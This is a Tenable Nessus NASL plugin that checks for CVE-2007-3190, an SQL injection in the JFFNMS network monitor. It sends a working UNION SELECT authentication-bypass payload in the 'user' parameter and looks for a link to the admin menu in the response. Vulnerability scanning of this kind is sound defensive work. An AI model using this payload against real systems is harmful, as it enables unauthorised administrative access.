#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25461);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2007-3190");
  script_bugtraq_id(24414);
  script_xref(name:"OSVDB", value:"37166");

  script_name(english:"JFFNMS auth.php Multiple Parameter SQL Injection");
  script_summary(english:"Tries to generate a SQL error");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running JFFNMS, an open-source network management
and monitoring system. 

The version of JFFNMS on the remote host fails to properly sanitize
user-supplied input to the 'user' parameter before using it in the
'lib/api.classes.inc.php' script in database queries.  Provide PHP's
'magic_quotes_gpc' setting is disabled, an unauthenticated remote
attacker can leverage this issue to launch SQL injection attacks
against the affected application, including bypassing authentication
and gaining administrative access to it." );
 script_set_attribute(attribute:"see_also", value:"http://www.nth-dimension.org.uk/pub/NDSA20070524.txt.asc" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2007-06/0217.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to JFFNMS version 0.8.4-pre3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/jffnms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the SQL injection flaw to bypass authentication.
  user = string(SCRIPT_NAME, "' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'--");
  pass = "";

  req = http_get(
    item:string(
      dir, "/?",
      "user=", urlencode(str:user), "&",
      "file=index&",
      "pass=", pass
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (isnull(res)) exit(0);

  # If...
  if (
    # the output looks like it's from JFFNMS and...
    ("jffnms=" >< res || "is part of JFFNMS" >< res) &&
    # we get a link to the admin menu
    "src='admin/menu.php" >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
